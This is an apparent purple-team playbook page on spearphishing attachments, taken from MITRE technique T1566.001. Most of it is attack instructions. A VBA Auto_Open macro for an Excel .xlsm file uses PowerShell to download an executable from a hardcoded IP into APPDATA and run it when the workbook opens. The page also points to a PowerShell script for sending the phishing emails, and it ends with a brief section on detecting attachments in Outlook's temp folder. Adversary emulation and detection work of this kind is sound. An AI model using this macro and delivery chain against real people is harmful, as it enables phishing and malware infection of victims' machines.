# [Spearfishing Attachment](https://attack.mitre.org/techniques/T1566/001/)

## Exploit syntax:

* Malicious Macro in Excel Example:
    
    1. Use the [SendPhishing](/Poshc2/pslo_scripts/Purple_pslo_scripts/SendPhishingAttachment.ps1) script as a template for sending emails over powershell
    2. Create an Excel document. Use the script below and insert it into the macro list:
    
    ```vbscript
    Sub Auto_Open()

    Dim com
    Set com = CreateObject("WScript.Shell")
    com.Run "powershell.exe -c iwr -uri ""http://64.132.36.76/pointy"" -OutFile ""$env:APPDATA\login.exe"""
    com.Run "powershell.exe -c start-sleep -seconds 1;start-process ""$env:APPDATA\login.exe"""
    Set com = Nothing

    End Sub
    ```
    
    3. Save the Excel document and name it as a .xlsm extension. The file name can be anything.
    4. Once the file is saved, edit the script to reflect the proper path the Excel document is saved.
        >*Make any other changes necessary in variables (if required)*
    5. Run the powershell script from the attacker workstation.
---
## Detection Techniques

* Search for files within the Content.Outlook folder. Potentially look for files created following an email.
    * file.path: *Content.Outlook*
    * Look in the mail log at the MIME type for the file of the email.
---
## Resources: 
https://www.slipstick.com/outlook/securetemp-files-folder/